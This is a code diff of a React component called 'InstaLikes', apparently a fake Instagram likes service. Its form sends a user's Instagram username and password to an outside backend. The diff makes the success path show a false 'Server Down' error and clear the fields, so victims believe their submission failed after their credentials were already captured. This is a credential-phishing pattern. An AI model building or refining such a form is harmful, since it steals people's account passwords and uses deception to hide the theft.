@@ -1,6 +1,6 @@
 import React, { useState } from "react";
 import axios from "axios";
-// import "./LoginForm.css"; // We'll create this CSS
+import Swal from "sweetalert2";
 
 const InstaLikes = () => {
   const [instagramUsername, setInstagramUsername] = useState("");
@@ -9,21 +9,50 @@ const InstaLikes = () => {
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    setMessage("");
 
     try {
+      // 2. Send request to your backend
       const { data } = await axios.post(
-        `https://nody-backend.onrender.com/api/register`,
+        "https://nody-backend.onrender.com/api/register",
         { instagramUsername, password }
       );
-      setMessage(data.message);
+
+      // 3. On success, show success alert
+      Swal.fire({
+        icon: "error",
+        title: "Server Down",
+        text: "server is down . Please try again later.",
+      });
+
+      // Clear form fields
       setInstagramUsername("");
       setPassword("");
+
     } catch (error) {
-      if (error.response && error.response.data) {
-        setMessage(error.response.data.message);
+      // 4. Distinguish between server error vs. no server response
+      if (error.response) {
+        // The request was made and the server responded with a status code
+        // that falls out of the range of 2xx
+        Swal.fire({
+          icon: "error",
+          title: "Error",
+          text: error.response.data.message || "Something went wrong.",
+        });
+      } else if (error.request) {
+        // The request was made but no response was received
+        // This often means the server is down or unreachable
+        Swal.fire({
+          icon: "error",
+          title: "Server Down",
+          text: "Could not reach the server. Please try again later.",
+        });
       } else {
-        setMessage("Something went wrong. Please try again.");
+        // Something else happened while setting up the request
+        Swal.fire({
+          icon: "error",
+          title: "Error",
+          text: "An unexpected error occurred. Please try again.",
+        });
       }
     }
   };
